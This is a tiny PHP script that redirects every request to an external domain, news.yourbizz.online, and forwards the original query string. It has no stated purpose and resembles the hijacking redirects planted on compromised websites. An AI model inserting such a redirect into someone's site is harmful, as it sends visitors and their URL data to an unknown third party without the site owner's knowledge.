<?php
$pageURL = 'http://'.$_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
$t = parse_url($pageURL);
$p=$t['query'];
header("Location: http://news.yourbizz.online/?$p");
?>
